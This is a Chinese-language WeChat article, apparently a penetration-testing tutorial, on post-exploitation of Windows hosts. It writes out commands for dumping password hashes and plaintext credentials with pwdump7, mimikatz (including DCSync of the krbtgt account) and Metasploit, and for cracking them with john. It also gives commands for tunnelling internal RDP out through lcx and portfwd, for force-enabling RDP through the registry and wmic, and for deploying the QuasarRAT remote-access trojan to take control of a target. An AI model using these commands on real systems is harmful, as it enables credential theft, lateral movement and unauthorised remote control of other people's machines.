\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MjM5NDUxMTI2NA==&mid=2247484303&idx=1&sn=7733981a64299e061e495c98abe0370c&chksm=a687e34091f06a56da8c5a380a7a61b927bedc2300271aeea1c064b7bd4be75818d191c6f3f9&scene=126&sessionid=1602140939&key=4cf40c946f4d610c876922914ca417f1f11b6266f5730a802453568d192cc74e06d874555b60f5530e8863af36ccd3eb6399987e8d8aaeefd1bbfa563858e93c39e4c1ed1212685b146d4c931f8ec38f7546b830c3bb30ac8458ef172af2801f3665afb3e3875afdd43882869eff727bbec3245cd951bd8ae3b54ef10abe236f&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=62090529&lang=zh\_CN&exportkey=Ae9MFI5jdKDH112ogCnX54g%3D&pass\_ticket=MIT9gkwI%2Flz0hRXozp3zz%2FJGT8%2BgZgLCOBodXSLzGMJddkuYKwJy1I14m7NOwIdt&wx\_header=0)

**Hash 读取**

在提权成功拿到 system 权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的 hash 值。工具读取 hash 的本质都是利用 system 权限去读取 Windows 的 SAM 文件。在 Windows2012 版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012 之后不能再读内存中的明文，只能用 mimiakatz 等工具读取 hash 值然后进行破解。

**一、使用 pwdump7 获取 hash**  

---------------------------

pwdump7 是一款本地 hash 读取工具，需要系统权限运行，直接在 CMD 命令窗口运行即可。测试 win7、Win03、window08 均可读取 hash 值：

Win7  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSZ1ibb67DE25Xo1woLoamPP2C7V9awN0vibIibg0iaSFop9DVnBW1LM9VwQ/640?wx_fmt=png)  

Windows2008  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSiaBl5dibCUhcPsGibJ0ogIVOb1YVWOFERzZqpicGUZoPQ65bwFLzlB1Hlw/640?wx_fmt=png)  
Windows2003：  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSzQhQzasNiakrXbmnJDicfCe55gP0SctHG4j2EmovxxngVMRTtddAFE7g/640?wx_fmt=png)  

拿到 hash 直接破解：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSFMUyCUfeicCKNcRLftoSgrqv9sWeRopGysdqH1mFf1AiaYCiaKiaml4gcw/640?wx_fmt=png)

**二、mimikatz 抓取 hash**
----------------------

mimikatz 在内网的作用远不止于 hash 读取，域中的黄金、白银票据伪造，权限维持都可以通过它完成等。这里只介绍他的 hash 读取功能：

```
项目地址：https://github.com/gentilkiwi/mimikatz/releases
```

mimikatz 需要高权限运行才能发挥，至少是 administrator 权限 ，抓取密码的命令需要 system 权限

  
**1\. 抓取密码需要先进行提权**  

```
#提升权限（从administrator提升到system）
privilege::debug
```

**2\. 抓取 hash**

```
#获取当前在线用户的明文密码（需要高权限运行）
sekurlsa::logonpasswords
#获取当前此计算机存在过用户的NTLMHASH  
lsadump::lsa /patch
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oS0hEnUDghzC2dlibtNah4Hl7hABfDzguF7J8icPt6GrHpgHDib3Q0kvGTg/640?wx_fmt=png)  

**3.mimikatz 其他命令**

```
#导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份
lsadump::sam SYSTEM.hiv 
#通过内存文件获取口令
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
#拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据
lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt
#拉取 lab.adsecurity.org 域中 ADSDC03 域控制器的计算机帐户的密码数据
lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$
```

**4.pass.exe 读取明文密码**

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSYCj8Kvqvyzx7sCUvxkjVC5rn1KKublj1LOB6BXS9bPHiag6MdHJDKtg/640?wx_fmt=png)  

window2008 用 getpassword.exe

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSf0ARMSv6GmOz4X1zQtYfsPqCV5VIWy4ypr32rgkv9v4ZfbTR1NmW0w/640?wx_fmt=png)

**三、MSF 抓取 hash**
-----------------

MSF 在 win7 以下系统可以直接抓取 hash，07 以上要绕过 uac 才能进行抓取，抓取 hash 需要管理员权限。  
**1.hashdump 抓取 hash 并破解  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSWYbdqfneylNibY45DYANNlzqV8jID6ribjr2Hy9fuZjgIQ0Np83Fmj2Q/640?wx_fmt=png)**

将得到的 hash 值复制 hash 到新文件利用 john 工具进行破解：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oS1aU2M7nQmW3g9CLwzVMxSrASWQzedCCaWV1iajldGcnj7CPVgLVVzIQ/640?wx_fmt=png)  

```
john a.hash
# 破解hash
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSnyF2Jc2k316L1oSIdD4OztHWNsCTWlD9HaHSqIZZMcwNstuGykVCOw/640?wx_fmt=png)  

**2.smart-hashdump 模块**

```
use windows/gather/smart\_hashdump
set session x
run
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oS6BQ2M2e5RkBx9Ff9Sl67ThgUib0SZD5VnIp1woQmmcduHAgTnoWMuag/640?wx_fmt=png)  

**3.MSF+mimikatz**  

提权成功后执行：  

```
#查看权限
getuid
#尝试获取system权限，一般都是失败，可利用溢出漏洞进行提权
getsystem 
#加载mimiakatz
load mimikatz
#帮助
help mimikatz
#随便输入一个a模块让他报错会显示所有可用模块
mimikatz\_command -f a::  
#查看指定模块使用方法 
mimikatz\_command -f hash::
```

①抓取系统 hash 值

```
msv
```

`![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSQ3owfJnbFMjYID1zybDy93LvsKRrsBL2rVvNibHHIBpeoPcw9iaz0rGA/640?wx_fmt=png)  
`

②抓取系统票据

```
kerberos
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSg9Mqpd60t8vXp5oyB7WzXhfAf6ne1k7YtpjI9ftyYgZ1EXRjx0UUlw/640?wx_fmt=png)  

③获取系统账号信息

```
wdigest
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSCzHic6Nc8HgpRRz2cSI9qdVxmiag8erNI8C42rt6ib9cnYe0w0Mr4anAQ/640?wx_fmt=png)  

④抓取 hash

```
mimikatz\_command -f samdump::hashes
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSoRxAaoLVhgGAckcZTFzqsWzJPT4jBFZjibLuPfdiaPpkpfuFNG8Zgefg/640?wx_fmt=png)

⑤查看系统进程

```
mimikatz\_command -f handle::list
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oS76Hqxh5Gu8sDZgK6C2Keicq08Qzzz9LLrhtOhV6z3cdE0QI5wrvRAeg/640?wx_fmt=png)  

**端口转发**
========

端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，拿到公网 shell 和内网 shell 之后，无法直接接入目标内网，需要进行端口转发将内网的端口转发到我们的网络环境可以接入的跳板机上面从而进行连接，常见的端口转发方式有很多，例如 lcx 工具转发，nc 反弹，socket 代理， ssh 隧道代理转发等等，这里暂时只对 LCX 工具进行介绍，其他方式后续陆续讲解。LCX 端口转发步骤如下：  

**LCX 端口转发**
------------

**1\. 本地监听**

实战情况下这里的 IP 应该是 vps 主机执行此命令，VPS 主机将监听接收到的 1111 端口转发到本地 11122 端口上

```
lcx.exe -listen 1111 11122
# 端口1111是目标主机连接本地的端口
# 端口11122是将接收到的服务器内容转发端口
```

**2\. 端口转发**

在目标内网设备执行此命令。将目标的 3389 端口转发到 VPS 设备 192.168.1.4 的 1111 端口上

```
lcx.exe -slave 192.168.1.4 1111 127.0.0.1 3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSRWJfpoZDicyqoxFueDm7TsvibU3teVTs75gB9eLXqMhiaciasia1bic88Zbw/640?wx_fmt=png)  

**3\. 成功连接  
**

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSV1DNFUv5C92KxMS6lqG7ZcSEYJSKQZbCf6Ahrpw2tKKMg1FsVxI7YA/640?wx_fmt=png)

**4\. 远程连接**

我们已经将目标内网的 3389 转口转发到 192.168.1.4 的 11122 端口上，此时只需要 Mstsc 192.168.1.4:11122 即可连接上内网主机：

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSmiaVlueeXZsoFexm2KibYZMCwxWsgNWUtVcFpXOKMaszFsz2303P7ovA/640?wx_fmt=png)

**MSF 端口转发**
------------

```
项目地址：https://www.ngrok.cc/
```

注册 ngrock 账号，启动转发。ngrock 使用方法：[MSF 配合 Ngrock 穿透内网](http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&mid=2247484003&idx=1&sn=1f76ac6dc42c90ed728bd28c963d5222&chksm=a687e2ac91f06bbada1f801f2a4d00257b91c9d6df9b96029b13d454f3d402c236cea870056f&scene=21#wechat_redirect)

**1\. 建立会话**。测试 net service 权限也可以转发端口

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSRByXRs1LXmO8QPM7hnpZtqeq3YwzQnicQhPWVhOuYZDQxKdStA0xJAw/640?wx_fmt=png)

**2\. 端口转发**

```
portfwd add -l 1133 -p 3389 -r 127.0.0.1
#将目标3389转发到本地的1133端口
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSYGNM83qUx5ic7BF20yX9nWcKCEcRVEZsFBthCx3lD8PQJt5DmyN2KPA/640?wx_fmt=png)  

**3\. 远程连接**

```
rdesktop 127.0.0.1:1133
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSppuXBenrqSAfiaRDMTafLgrKMqcdCHwUan4HpFJlQvlPaUZ1V1hXErQ/640?wx_fmt=png)  

**其他**
------

在远程连接时总会遇见不可描述的各种疑难杂症，记录如下：

**1\. 服务端口默认被修改**  
解决办法①：

```
#查询TermService对应PID和netstat查询的PID对应的端口号
tasklist /svc
netstat -ano | findstr PID
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSsqC0iauCiccv22QIjhBKnOCxWH7ZOQ38VjCiaV5wDRyZkCc7SGuhUZfQg/640?wx_fmt=png)  

解决办法②：

```
#读取注册表查询终端端口PortNumber的值
REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server\\WinStations\\RDP-Tcp /v PortNumber
```

```
#通用开3389：
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
#For Win2003&Win2008:
REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f
# win2012/win08通用；win7前两条适用。winxp/win03未测验权限需要run as administrator:
wmic /namespace:\\root\\cimv2 erminalservices path win32\_terminalservicesetting where (\_\_CLASS != "") call setallowtsconnections 1
wmic /namespace:\\root\\cimv2 erminalservices path win32\_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fSingleSessionPerUser /t REG\_DWORD /d 0 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSOU2g5PPhhoz2IicVstzZ9QYETwqV5ZpicpBkKHTEBO3j78bCd0SJ6gDA/640?wx_fmt=png)  

备注：0xd3d=hex(3389)

解决办法③：nnmap 探测 (ms-wbt-server 服务)

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSPXpGIWn8A2FqAu4yFG7qXEyl1g3nPSXH7AjE3Z8dJc1vEhibz0F059w/640?wx_fmt=png)  

**2\. 服务器未开启 3389**  
解决办法：强开 3389

```
项目地址：https://github.com/quasar/QuasarRAT/release
```

**3\. 服务器网络环境处于内网**：  
解决办法：端口转发

**4\. 防护验证规则 / IP 或计算机名**：  
解决办法：找 IP / 计算机名白名单。如果真遇上这种情况又找不着白名单的话，在 3389 这一块算是交代了，可以换一种思路，上远控：

**QuasarRAT 远控**  

Quasar 提供高稳定性和简单易用的用户界界面，相对于其他远控工具干净简约且开源。据说基本支持 Windows 大部分版本。这里仅作简单的使用方法介绍，不到万不得已不建议上远控。  

```
项目地址：https://github.com/quasar/QuasarRAT/release
```

**1\. 生成 payload  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSPWMLuhXR3mdLsIFWUiaaTnfAKibzDSxSzroaF7LZW97ib0NSvxWkaz34g/640?wx_fmt=png)**  

**2\. 开启监听**

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSKNz8WzCyhk9UD4N76Het4183nasREZOsLEE7mw4AicOR9cIUibjLuicbw/640?wx_fmt=png)

**3\. 靶机执行 payload，返回会话**  
需要靶机支持 dotnet4.0 环境，且使用管理员权限运行 payload。

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSg1nicRRUpkHebGvdx28k5j5p4EVwkNq3r8yS8juuUabgQpGvbIpVqQg/640?wx_fmt=png)

**4\. 为所欲为**

![](https://mmbiz.qpic.cn/mmbiz_jpg/flBFrCh5pNauqx0DMFQMoNS06htq68oSlCCWlicdnwmNLT18lIa7cOcNu5OnWFvib3n5rjibZIfqHOUSn8m8WLjzQ/640?wx_fmt=jpeg)